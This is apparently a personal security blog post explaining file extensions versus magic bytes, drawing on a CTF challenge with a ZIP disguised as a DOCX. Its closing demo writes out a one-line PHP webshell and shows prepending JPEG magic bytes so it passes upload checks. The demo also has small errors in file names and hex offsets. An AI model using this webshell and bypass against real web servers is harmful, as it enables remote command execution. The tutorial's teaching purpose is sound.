---
title: "File Magic Bytes — Why You Can Never Trust a File Extension"
date: 2026-05-23
categories: [Concepts, Forensics]
tags: [forensics, magic-bytes, file-signatures, ctf, digital-forensics, steganography]
classes: wide
---

# Hiding In PL41N S1GHT

A file extension is a suggestion. That's it. It's a label stuck on the outside of a box that tells you what's supposed to be inside but nothing actually stops someone from putting something completely different in the box and slapping the wrong label on it anyway.

This came up for me during a CTF challenge called Invasion. The task involved a file with a `.docx` extension. Just open it in LibreOffice right? Except it wouldn't open properly. So I ran `file` on it(a Linux command that ignores the extension entirely and looks at the actual content of the file to figure out what it really is)and it turned out it wasn't a wWord document at all. It was a ZIP archive. So I unzipped it. And what came out was another file that also wasn't what it claimed to be.

Two layers of mislabelling. That's the double trick and understanding why it's even possible requires understanding what file extensions actually are versus what magic bytes are.

---

## What a File Extension Actually Is

When you see `document.docx`, the `.docx` part is just text appended to the filename. Your operating system uses it as a hint to decide which application to open the file with. Windows sees `.docx` and opens Word. Linux sees `.jpg` and opens an image viewer. That's the entire job of the extension. Baiscally a routing label for the OS not a description of the file's actual contents.

The critical thing: **the operating system doesn't verify it.** You can rename `photo.jpg` to `photo.exe` and the file's actual content doesn't change at all. You can rename `malware.exe` to `document.pdf` and most systems will just try to open it with a PDF reader. The label and the contents are completely independent of each other.

Might be wondering why disguises like this aren't just..stopped? Well truth is the extension system was never meant to be a security boundary. It was just convenience. But that convenience becomes a serious problem the moment someone realizes they can lie about it.

---

## What Magic Bytes Actually Are

While file extensions are just labels, most file formats have something much more reliable baked into them; a file signature, also called **magic bytes**.

When a file format is designed, the people who designed it usually reserve the first few bytes of the file for a specific, fixed pattern that identifies the format. This pattern is called the magic number or magic bytes. It lives inside the actual file content, not in the filename, which means it can't be changed by simply renaming the file.

Some examples of real magic bytes:

```
PNG image:     89 50 4E 47 0D 0A 1A 0A
               (reads as: .PNG in ASCII)

JPEG image:    FF D8 FF
               (always starts with these three bytes)

ZIP archive:   50 4B 03 04
               (reads as: PK — after Phil Katz, ZIP's creator)

PDF:           25 50 44 46
               (reads as: %PDF)

Windows EXE:   4D 5A
               (reads as: MZ — after Mark Zbikowski, DOS designer)

DOCX/XLSX:     50 4B 03 04
               (yes, same as ZIP — because Office formats ARE zip archives)
```

When you run the `file` command on Linux, it reads these bytes and compares them against a database of known signatures. It doesn't care what the filename says. It reads the content and tells you what it actually is.

```bash
file suspicious.docx
# Output: suspicious.docx: Zip archive data
```

That one command cuts through the label entirely and tells you what's actually in the box.

---

## The Double Trick

Back to the CTF. The file was named `something.docx`. The `file` command said it was a ZIP. That's the first layer — a ZIP pretending to be a Word document.

Unzipping it revealed another file. Running `file` on that one showed it was a CDFV2 Encrypted file — Microsoft's older compound document file format, used by older Office versions with password encryption. That's the second layer; an encrypted Office document hiding inside a ZIP that was disguised as a modern Word document.

```
suspicious.docx
     actually a ZIP (magic bytes: 50 4B 03 04)
         inside: encrypted.docx
             actually CDFV2 Encrypted
                 bcrypt-based, too slow to crack
```

Each layer required a different approach to peel back. The extension told you nothing useful at any point. The magic bytes told you everything.

This is actually more common than you'd expect in forensics and CTF challenges. Files get nested inside other files, extensions get swapped, real content gets hidden behind misleading labels. The only reliable way through is to always check what the file actually is before assuming what it is.

---

## Why DOCX IS a ZIP (And What That Means)

This one surprises people when they first hear it. Modern Office files:`.docx`, `.xlsx`, `.pptx` are actually ZIP archives. That's why the magic bytes for a DOCX are `50 4B 03 04`, identical to a ZIP file. Microsoft switched to this format in Office 2007 (the Open XML format) and it's been this way ever since.

If you rename any `.docx` to `.zip` and extract it, you'll find a folder structure full of XML files. The document text is in there, the styles, the images, the relationships between components. All plain XML inside a ZIP container.

```bash
cp document.docx document.zip
unzip document.zip -d document_contents
ls document_contents/
# word/  _rels/  [Content_Types].xml  docProps/
```

This is relevant for forensics because it means a DOCX file can contain hidden files inside the ZIP structure that aren't part of the document itself. Someone could embed arbitrary data in a word document by adding files to the ZIP container that the office application simply ignores when rendering the document. The document looks normal when opened but there's extra content hiding in the archive.

---

## How to Check Magic Bytes

The practical toolkit for this is simple.

**On Linux:**

```bash
# The quick check - i use this more often
file suspicious_file

# Read the first 16 bytes of the hex
xxd suspicious_file | head -2

# With hexdump
hexdump -C suspicious_file | head -3
```

**What you're looking at:**

```
00000000: 504b 0304 1400 0000 0800 ...
          ^^^^
          PK = ZIP archive
```

The first column is the byte offset, the second is the hex values, the third is the ASCII representation. The magic bytes are at offset 0. The very beginning.

**Online:**

There are several websites that let you upload a file and identify it by magic bytes. [Gary Kessler's File Signatures Table](https://www.garykessler.net/library/file_sigs.html) is the most comprehensive reference as it lists magic bytes for hundreds of file formats. Wikipedia also maintains a solid [List of File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) that's useful for quick lookups during CTFs and forensics work.

---

## Why This Matters Beyond CTFs

File magic bytes aren't just a forensics curiosity. They have real security implications.

**Malware disguised as images.** A classic attack involves uploading a file that looks like a `.jpg` to a web application but actually contains executable code. If the application only checks the extension and not the magic bytes, it might accept the upload, store it as an image, and serve it potentially executing the embedded code depending on the server configuration.

**Forensic investigation.** In incident response, attackers frequently rename files to hide what they are. A keylogger renamed to `system32.dll`, exfiltrated data saved as `backup.jpg`, a reverse shell script renamed to `update.py`. Magic bytes analysis is one of the first things forensic investigators run because it tells you what things actually are regardless of what someone tried to make them look like.

**Email filter evasion.** Some email security gateways block attachments by extension. Renaming a malicious executable to `.pdf` can sometimes bypass naive filters that only check extensions. Proper security tools check both the extension AND the magic bytes, and flag mismatches as suspicious.

**Steganography.** Files can be crafted so that they're simultaneously valid in two formats, a technique called polyglot files. A file might be both a valid JPEG and a valid ZIP at the same time, with the image visible when opened in an image viewer and the hidden archive accessible when extracted with a ZIP tool. This is a favourite CTF technique and a real-world steganography method.

---

## The Lesson

```
Extension = what someone says a file is
Magic bytes = what a file actually is

When those two disagree, believe the magic bytes.
```

The `file` command should be the first thing you run on any unfamiliar file during a CTF, a forensics investigation, or any situation where you need to know what you're actually dealing with. It takes less than a second and it has never once cared what the filename says.

Files lie. Magic bytes don't.

---

## Practical Demo — Faking a File in Under a Minute

You don't need a CTF or a lab environment to see this in action. Open a terminal and try this yourself right now.

**Step 1 — Create a PHP file disguised as an image:**

```bash
# A basic PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Copy it with a jpg extension
cp shell.php shell.jpg

# Ask the file command what it really is
file shell.jpg
# Output: shell.jpg: PHP script, ASCII text
```

The extension says `.jpg`. The `file` command doesn't care It reads the content and immediately calls it out as php.

**Step 2 — Add magic bytes to fool content-based checks:**

```bash
# Add real JPEG magic bytes (FF D8 FF) to the PHP file
printf '\xff\xd8\xff' | cat - shell.php > magic.jpg

# Now ask file what it is
file magic.jpg
# Output: magic.jpg: JPEG image data
```

Now `file` reports it as a JPEG. The magic bytes at the start convinced it. An application that checks magic bytes instead of just extension would accept this too.

**Step 3 — But the malicious content is still there:**

```bash
# Read the raw bytes
xxd shell_magic.jpg | head -3
# 00000000: ffd8 ff3c 3f70 6870 2073 7973 7465 6d28  ...<?php system(
# 00000001: 245f 4745 545b 2263 6d64 225d 293b 203f  $_GET["cmd"]); ?
```

The JPEG header is there. So is the PHP webshell right behind it. The file is simultaneously "a JPEG" according to magic bytes and "a PHP script" according to its actual content. If this gets uploaded to a misconfigured web server that serves it through a php interpreter, the php code runs regardless of the `.jpg` extension.

This is exactly the technique used in real-world file upload bypasses. The application checks for a JPEG, gets a JPEG header, accepts the file. The server executes it as php. Shell obtained.


---

## Practice Labs

If you want to get hands-on with this concept:

- **[PicoCTF](https://picoctf.org/)** — search for forensics challenges involving file type identification. Many beginner-level challenges are built around magic bytes.
- **[TryHackMe — CC: Pen Testing](https://tryhackme.com/room/ccpentesting)** — includes basic forensics challenges.
- **[CyberChef](https://gchq.github.io/CyberChef/)** — browser-based tool that lets you analyse file bytes, convert between formats, and detect file types. Essential for this kind of work.

---

*Written by 0x5h4q | 0x5h4q.github.io*
